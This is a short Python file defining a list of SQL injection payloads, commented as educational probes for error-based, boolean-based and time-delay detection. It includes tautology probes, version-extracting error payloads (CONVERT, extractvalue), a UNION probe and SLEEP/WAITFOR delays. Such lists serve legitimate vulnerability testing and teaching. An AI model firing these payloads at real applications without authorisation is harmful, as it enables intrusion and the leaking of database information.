from typing import List

# Basic educational SQL Injection payloads
# Focused on error-based and boolean-based detection

SQLI_PAYLOADS: List[str] = [
    # Basic probes
    "'",
    "\"",
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' #",
    "\" OR \"1\"=\"1",
    "1' OR '1'='1",

    # Boolean based
    "' AND '1'='1",
    "' AND '1'='2",
    "1 AND 1=1",
    "1 AND 1=2",

    # Error based (common DBMS)
    "' AND 1=CONVERT(int, (SELECT @@version)) --",
    "' AND extractvalue(1, concat(0x7e, version())) --",
    "' AND 1=1 UNION SELECT null --",

    # Time-based light probes (kept mild)
    "' OR SLEEP(2) --",
    "1; WAITFOR DELAY '0:0:2' --",

    # Simple numeric
    "1 OR 1=1",
    "1 OR 1=2",
]